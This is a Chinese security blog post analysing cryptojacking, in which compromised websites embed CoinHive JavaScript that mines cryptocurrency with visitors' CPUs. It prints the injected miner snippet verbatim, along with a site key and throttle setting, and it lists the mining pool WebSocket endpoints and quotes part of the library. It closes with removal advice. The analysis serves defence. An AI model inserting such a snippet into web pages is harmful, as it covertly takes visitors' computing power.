***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

##  **0x0背景**

**挖矿目前已经成为黑帽子牟利的主要手段，最近上网偶然间发现部分网站被挂马后存在网页挖矿的行为，区别于常规病毒操作系统中挖矿行为，网页主要在网站上挂上恶意的JS脚本，访问该网站即触发挖矿动作。**

**目前很多网页挖矿主要以CoinHive的方式较多，一般挖矿用户以主动方式直接使用C或者其他语言构造的miner客户端进行CPU或GPU计算Hash。前端挖矿用户以被动或主动方式在不知情或知情情况下利用浏览者的CPU或GPU。**

##  **0x1现象**

访问恶意网站时CPU飙升，关闭网站后回复正常水平。

![图片1.png](https://image.3001.net/images/20180817/1534469944_5b76273849103.png!small)

关闭之后：

![图片2.png](https://image.3001.net/images/20180817/1534469960_5b762748b07ef.png!small)

##  **0x2源代码分析** ****

查看网页源代码可发现部分挖矿的代码，经过简单确定非手机浏览器后，即开始挖矿的动作。

![图片3.png](https://image.3001.net/images/20180817/1534469994_5b76276a1499e.png!small)

浏览器进程占用了较大的CPU资源：

![图片4.png](https://image.3001.net/images/20180817/1534470011_5b76277bd7a07.png!small)

查看浏览器进程中，可以在内存地址中发现有挖矿地址的痕迹：

![图片5.png](https://image.3001.net/images/20180817/1534470027_5b76278b23590.png!small)

主要引用的挖矿代码的详细都在引用的JS脚本当中，仅使用70%的CPU资源。

    
    
    <script src="<https://coinhive.com/lib/coinhive.min.js>"></script>
    
    <script>
    
     var miner = new CoinHive.Anonymous('Jgv7noixIKHmJ7IIhAR9jySAwG3ZU8vt', {throttle: 0.7});
    
     if (!miner.isMobile() && !miner.didOptOut(14400)) {
    
     miner.start();
    
    }
    
    </script>

Jgv7noixIKHmJ7IIhAR9jySAwG3ZU8vt：CoinHive 当中的钱包地址；

throttle：浏览器占用CPU的阈值，调节到合适的阈值时用户会很难注意到浏览器的算力被滥用。

coinhive.min.js源码如下：

![图片6.png](https://image.3001.net/images/20180817/1534470128_5b7627f04df28.png!small)

挖矿脚本使用WebSocket与矿池进行通信，部分的矿池结点如下：

    
    
    wss://ws001.coinhive.com/proxy  
    
    wss://ws002.coinhive.com/proxy  
    
    wss://ws003.coinhive.com/proxy  
    
    wss://ws004.coinhive.com/proxy  
    
    wss://ws005.coinhive.com/proxy  
    
    wss://ws006.coinhive.com/proxy  
    
    wss://ws007.coinhive.com/proxy  
    
    wss://ws008.coinhive.com/proxy  
    
    wss://ws009.coinhive.com/proxy  
    
    wss://ws010.coinhive.com/proxy  
    
    wss://ws011.coinhive.com/proxy  
    
    wss://ws012.coinhive.com/proxy

![图片7.png](https://image.3001.net/images/20180817/1534470158_5b76280e3ca78.png!small)

挖矿脚本允许自动调节线程数目：

    
    
    this._throttle=Math.max(0,Math.min(.99,this.params.throttle||0));
    
    this._stopOnInvalidOptIn=false;
    
    this._waitingForAuth=false;
    
    this._selfTestSuccess=false;
    
    this._verifyThread=null;
    
    this._autoThreads={
    
    enabled:!!this.params.autoThreads,
    
    interval:null,
    
    adjustAt:null,
    
    adjustEvery:1e4,
    
    stats:{}
    
    };
    
    this._tab={
    
    ident:Math.random()*16777215|0,
    
    mode:CoinHive.IF_EXCLUSIVE_TAB,g
    
    race:0,
    
    waitReconnect:0,
    
    lastPingReceived:0,
    
    interval:null
    
    };

![图片8.png](https://image.3001.net/images/20180817/1534470200_5b762838b5c00.png!small)

##  **0x3 解决方法:**

1.根据页面后查看网页源代码，搜索有关于CoinHive，Miner等关键字可以快速定位到界面，使用记事本或者网页编辑器删除挖矿的关键代码。

2.访问小电影网站时候多留心自己的CPU性能。

 ***本文作者[si1ence](http://www.freebuf.com/wp-admin/edit.php?post_type=post&author=274485)，转载请注明来自FreeBuf.COM**

